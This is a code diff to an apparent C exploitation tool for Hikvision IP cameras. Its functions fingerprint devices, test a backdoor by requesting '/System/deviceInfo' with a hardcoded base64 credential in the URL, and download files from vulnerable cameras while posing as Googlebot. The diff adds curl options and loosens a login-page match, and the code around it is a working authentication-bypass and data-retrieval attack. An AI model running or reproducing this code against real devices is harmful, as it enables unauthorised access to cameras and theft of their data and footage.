@@ -52,6 +52,9 @@ int hikvisionCheck(char *ip){
  
   		chunk.memory = malloc(1);  /* will be grown as needed by the realloc above */
   		chunk.size = 0;
+
+  		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYSTATUS, 0);
+		curl_easy_setopt(curl, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
 		curl_easy_setopt(curl, CURLOPT_URL, url);
 		curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
 		curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Safari/537.36");
@@ -82,7 +85,7 @@ int hikvisionCheck(char *ip){
 		deleteNullBytes(chunk.memory, chunk.size);
 
 		chunk.memory[chunk.size-1] = '\0';
-		char *comp = strstr(chunk.memory, "/doc/page/login.asp?_");
+		char *comp = strstr(chunk.memory, "doc/page/login.asp");
 		free(chunk.memory);
 		if (comp)
 			return 1;
@@ -106,10 +109,14 @@ int backdoorCheck(char *ip){
 			char* url;
 			asprintf(&url,"%s/System/deviceInfo?auth=YWRtaW46MTEK",ip);
 			FILE *black_hole = fopen("/dev/null", "wb");
+
+			curl_easy_setopt(curl, CURLOPT_SSL_VERIFYSTATUS, 0);
+			curl_easy_setopt(curl, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
 			curl_easy_setopt(curl, CURLOPT_URL, url);
 			curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
 			curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Safari/537.36");
 			curl_easy_setopt(curl, CURLOPT_WRITEDATA, black_hole);
+
 			res = curl_easy_perform(curl);
 
 			if(res != CURLE_OK){
@@ -155,6 +162,9 @@ int download(char *ip, enum downloadFile filetype, FILE* fd){
 			return -1;
 		}
 		if(curl) {
+			
+			curl_easy_setopt(curl, CURLOPT_SSL_VERIFYSTATUS, 0);
+			curl_easy_setopt(curl, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
 			curl_easy_setopt(curl, CURLOPT_URL, url);
 			curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
 			curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Safari/537.36");
